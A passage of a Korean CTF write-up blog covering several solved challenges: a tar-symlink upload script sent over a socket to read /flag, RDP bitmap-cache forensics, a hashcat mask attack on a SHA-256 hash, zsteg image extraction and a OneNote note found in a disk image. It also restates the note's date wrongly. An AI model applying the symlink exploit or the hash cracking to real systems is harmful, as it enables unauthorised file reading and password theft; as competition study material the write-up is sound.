AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA==".replace(b'\n', b'')
    s.sendall(b64_tar + b'\n')
    time.sleep(1)  
    s.sendall(b'1\n') 

    response = s.recv(4096)
    while response:
        print(response.decode(errors='ignore'), end='')
        response = s.recv(4096)
```

/flag로 심볼릭 링크 만들고 tar로 압축해준다  
tar 파일 base64로 스근하게 변환해주고 socket으로 보내주면 플래그를 얻을 수 있다  
<br>

---

## **Lateral Movement**

### Watch - Forensic

While analyzing the compromised PC, RDP-related data was discovered.

Analyze the data and retrieve the string that was written in Notepad during the RDP session  
<br>

---

풀이법이 [이 글](https://medium.com/@yashkumarnavadiya/htb-no-place-to-hide-easy-forensics-challenge-b025c864607a)이랑 완전 똑같다  
<br>

---

![Image](/assets/img/250426_0/19.png)

`Cache0000.bin`{: .filepath}과 `bcache24.bmc`{: .filepath}가 주어진다  
`bcache24.bmc`{: .filepath}는 0KB로 아무것도 없는 것 같고 (확인도 안 해봄) `Cache0000.bin`{: .filepath}으로만 갖고 놀면 된다  
<br>

---

```bash
python ./bmc-tools.py -s Cache0000.bin -d .
```

```bash
python ./bmc-tools.py -s Cache0000.bin -d . -b
```

첫 번째 명령어는 bin 파일 분해해서 bmp 파일 1937개 뿌리기  
두 번째 명령어는 1937개 뿌리지 말고 하나로 합치기  
<br>

---

![Image](/assets/img/250426_0/20.png)

아무래도 보기 편한건 하나로 합친 사진이다  
플래그가 찢겨져서 분산되어 있는 것처럼 보일 수 있다  
<br>

---

![Image](/assets/img/250426_0/21.png)

사진의 4시 30분 방향을 보면 플래그 풀문을 확인할 수 있다  
블로그에서 사진을 잘라서 저화질로 잘 안 보이지만 실제로 해보면 아주 잘 보인다  
<br>

---

![Image](/assets/img/250426_0/22.png)

조금 웃기지만 파일을 글자 역순으로 정렬하고 아이콘을 크게 해서 볼 수도 있다  
<br>

---

## **Credential Access**

### Cat

An encrypted hash value like the one below has been discovered.

Use the following pattern as a reference and decrypt the hash: ?l?d?l?l?l?d!?d?d

27AC620A35D509F992EDC3F06DB3EC04C3610AE52F24F3CF13F29662EB4EF4F2  
<br>

---

![Image](/assets/img/250426_0/23.png)

```bash
hashcat -a 3 -m 1400 hash.txt '?l?d?l?l?l?d!?d?d'

# h4ckm3!25
```

hashcat으로 뚫을 수 있다

\-a 3 옵션 -> Brute Force (3) Attack  
\-m 1400 옵션 -> SHA256(1400)  
<br>

---

## **Collection**

### Hidden Image - Misc

![Image](/assets/img/250426_0/24.png)

이런 이미지 파일이 주어진다  
<br>

---

![Image](/assets/img/250426_0/25.png)

zsteg로 파일 또는 데이터를 추출해볼 수 있는데 PNG image data가 들어가있는 것을 확인할 수 있다

```bash
zsteg -E b1,rgb,lsb,xy 'Hidden message.png' > hidden_image.png
```  
<br>

---

![Image](/assets/img/250426_0/26.png)

삽입된 파일을 추출할 수 있다

처음엔 저 PNG image data가 hidden\_message.png 원본 이미지인 줄 알고 애꿎은 OpenPGP 키 파일만 추출해서 이게 뭐지하고 있었다..  
그래도 이것저것 시도하면서 다양한 CTF 문제에서의 사례들도 많이 찾아볼 수 있었다  
오히려 다행이다 좋은 사이트들을 많이 찾아놓았다  
<br>

---

### Nothing is essential - Forensic

Analyze the PC to identify the time of the meeting scheduled by the user.  
<br>

---

![Image](/assets/img/250426_0/27.png)

`Disk.ad1`{: .filepath} 이미지 파일 주길래 FTK Imager에 넣었다  
john7 유저 폴더 있고 그 안에 미팅 스케쥴을 적을 수 있는 다양한 앱들의 데이터 폴더들이 보인다  
OneNote, Notepad++, Notion 등등  
<br>

---

![Image](/assets/img/250426_0/28.png)

`Users/john7/AppData/Local/Microsoft/OneNote/16.0/Memory/notes.sdk\_{uuid}.db`{: .filepath}

SQLite3 포맷의 파일이 하나 있다  
딱 봐도 열면 원노트에서 작성한 노트들이 나오지 않을까 싶다  
<br>

---

![Image](/assets/img/250426_0/29.png)

```json
{
  " id " : " 26078023 - c8db - 4941 - b772 - b379fb73c7c5 ",
      " createdByApp " : " OneNoteMemory ",
                           " title " : " Schedule appointment
      : Meet’s doorstep on 14 March 2025 at 17 : 40 ",
        " document " : {
          " type " : " document ",
          " content " : [ {
            " id " : " 46d3d76c - d83e - 497c - a3d8 - 55fd892f6a40 ",
            " key " : "
                        ",
            " type " : " paragraph ",
            " content " : {
              " text " : " Schedule
              appointment : Meet’s doorstep on 14 March 2025 at 17 : 40 ",
              " inlineStyles " : []
            },
            " blockStyle " :
                {" bullet " : false, " textDirection " : " ltr "}
          } ]
        },
                         " color "
      : " Purple ",
        " remoteId " : " AAkALgAAAAAAHYQDEapmEc2byACqAC -
                         EWg0AJtyts2HHqES3FFOc_adTkQABObb - agAA ",
        " changeKey " : " CQAAABYAAAAm3K2zYceoRLcUU5z5p1ORAAE5sfNF ",
                          " serverShadowNote "
      : {
        " id " : " 26078023 - c8db - 4941 - b772 - b379fb73c7c5 ",
        " createdByApp " : " OneNoteMemory ",
        " title " : " Schedule
        appointment : Meet’s doorstep on 14 March 2025 at 17 : 40 ",
        " document " : {
          " type " : " document ",
          " content " : [ {
            " id " : " 46d3d76c - d83e - 497c - a3d8 - 55fd892f6a40 ",
            " key " : "
                        ",
            " type " : " paragraph ",
            " content " : {
              " text " : " Schedule
              appointment : Meet’s doorstep on 14 March 2025 at 17 : 40 ",
              " inlineStyles " : []
            },
            " blockStyle " :
                {" bullet " : false, " textDirection " : " ltr "}
          } ]
        },
        " color " : " Purple ",
        " deleted " : false,
        " createdAt " : 1741758926000,
        " documentModifiedAt " : 1741758966573,
        " media " : [],
        " deletedMediaIds " : [],
        " metadata " : {
          " context " : {
            " displayName " : "
                                ",
            " host " : " unknown.exe ",
            " hostIcon " : "
                             ",
            " url " : "
                        "
          }
        }
      },
        " deleted " : false,
                        " createdAt " : 1741758926000,
                        " lastModified " : 1741758966000,
                        " documentModifiedAt " : 1741758966573,
                        " media " : [],
                                      " deletedMediaIds " : [],
                                                              " metadata " : {
    " context " : {
      "displayName":"","host":"unknown.exe","hostIcon":"","url":""
    }
  }
}
```

2025년 4월 14일 오후 5시 40분에 만난다고 한다  
플래그 형식에 맞춰서 제출하면 된다  
<br>

---  
<br>

---  
<br>

---

![Image](/assets/img/250426_0/30.png)  
![Image](/assets/img/250426_0/31.png)

10문제 풀어서 43등으로 마무리했다  
3문제 더 풀면 20등 안에 들고 20등 안에서도 동점 팀이 많아서 팀끼리 점수 차가 촘촘했다  
대회 전날 밤 4등으로 낭낭하게 본선에 가는 꿈을 꿨었는데 4등은 커녕 20등 안에도 못 들었다ㅋㅋ  

이번에 팀으로 참가했는데 확실히 팀이 좋다  
비록 나 혼자 10문제 중 9문제 풀긴 했지만 팀으로 하면 그냥 재밌다    
<br>

---

![Image](/assets/img/250426_0/32.png)

그리고 한 문제라도 풀어줬기 때문에 43등이라도 했다고 생각한다  
팀끼리 너무 촘촘해서 9문제만 풀었다면 50등 밑이지 않을까 싶다  
9보다는 두 자리수인 10이 훨씬 낫기도 하고..  

팀원 2명은 카톡으로 구한 거라 서로 이름만 알아서 대회하면서 별 교류가 없었다  
그냥 단순히 문제 푸는 과정만 간략하게 디코 스레드에 올리고 문제 의논도 친구랑만 했던게 좀 아쉽긴 했다  
그래도 팀장인데 뭔 문제 풀고 있는지라도 물어보면서 좀 더 적극적으로 했어야 하나 싶기도 하다..  

지난 핵테온 세종 후기들을 읽어 봤을 때 운영이나 문제 퀄리티에 있어서 말이 좀 많았던 것 같은데 서버가 터지는 일도 없었고, 내가 평가할 정도의 수준은 아니지만 문제도 좋았던 것 같다  
저번에 동아리에서 코드 게이트 같이 해봤을 때 한 문제도 못 풀고 끝났는데 이번엔 그래도 몇 문제 풀어서 다행이다  
운이 좀 좋았던 것 같다

그리고 어쩌다 보니까 정말 감사하게도 상위권 팀 writeup도 얻게 되서 그거 보면서 한번 공부해봐야겠다